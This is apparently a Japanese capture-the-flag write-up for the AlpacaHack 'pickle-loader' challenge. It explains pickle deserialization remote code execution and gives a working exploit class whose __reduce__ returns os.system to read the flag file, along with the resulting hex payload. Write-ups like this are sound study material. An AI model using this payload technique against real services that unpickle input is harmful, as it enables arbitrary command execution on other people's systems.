# 2026/02/19 問題

https://alpacahack.com/daily/challenges/pickle-loader

## 問題文

```
pickle loading

nc 34.170.146.252 59206
```

## 考察

いつもの如くコマンド実行

```
$ nc 34.170.146.252 59206
> aa
Traceback (most recent call last):
  File "/app/server.py", line 1, in <module>
    __import__("pickle").loads(bytes.fromhex(input("> ")))
    ~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^
_pickle.UnpicklingError: invalid load key, '\xaa'.
```

実装を確認

```
# server.py
__import__("pickle").loads(bytes.fromhex(input("> ")))
```

`pickle` もしくは `bytes.fromhex` あたりの脆弱性だろうと思い検索。　CVE こそ採番されていないものの、Pickle のデシリアライズ脆弱性 (Pickele RCE) という有名な脆弱性がヒット。

そもそも Pickle とは Python オブジェクトをシリアライズ・デシリアライズするためのライブラリ。 Pickle RCE はシリアライズした Python オブジェクトに関数 `__reduce__` を定義したクラスを含めておくと、デシリアライズ ( `pickle.loads` ) のタイミングで任意の関数が実行できてしまうという脆弱性

今回の場合、以下のようなファイルを用意する。あとはフラグを獲得するためのコマンドを `__reduce__` 内に仕込めば良い。

```
import pickle
import os

class Exploit:
    def __reduce__(self):
        攻撃用コード

# `.dump` で攻撃用コードをシリアライズ
payload_bytes = pickle.dumps(Exploit())

# サーバー側は 16 進数で受け取ることを期待しているので 16 進数化
payload_hex = payload_bytes.hex()

print(payload_hex)
```

どこに FLAG のファイルがあるか確認

```
FROM python:3.14.2
WORKDIR /app
RUN apt-get update && apt-get install -yq socat

COPY flag.txt server.py ./
RUN mv flag.txt /flag-$(md5sum flag.txt | cut -c-32).txt

USER nobody:nogroup
CMD ["socat", "-T30", "tcp-listen:1337,fork,reuseaddr", "exec:'python server.py',stderr"]
```

`/` 直下だが、ファイル名がハッシュ化されている。しかし、 `flag-~.py` は１つしかないので、ワイルドカードで無理矢理突破する。

```
class Exploit:
   def __reduce__(self):
       # デシリアライズ(loads)される瞬間に、第一引数の関数に第二引数を渡して実行する
       # ランダムなファイル名対策としてワイルドカード (*) を使う
       return (os.system, ("cat /flag*.txt",))
```

## 解答

出来上がったファイルを手元で実行

```
$ python3 2026-02/02-19_misc/pickle_rce.py
80049526000000000000008c026f73948c0673797374656d9493948c0e636174202f666c61672a2e74787494859452942e
```

これを投げる。通った

```
$ nc 34.170.146.252 59206
> 80049526000000000000008c026f73948c0673797374656d9493948c0e636174202f666c61672a2e74787494859452942e
Alpaca{congratz! bubuzuke dosu}%
```

## 参考

- socat
  - 2つの双方向バイトストリームを確立し、それらの間でデータを転送するコマンドラインベースのユーティリティ
  - CTF においては `xinetd` と並び、標準入出力で動く CLI プログラムを簡単TCPサーバー化するための道具としてよく使われるらしい
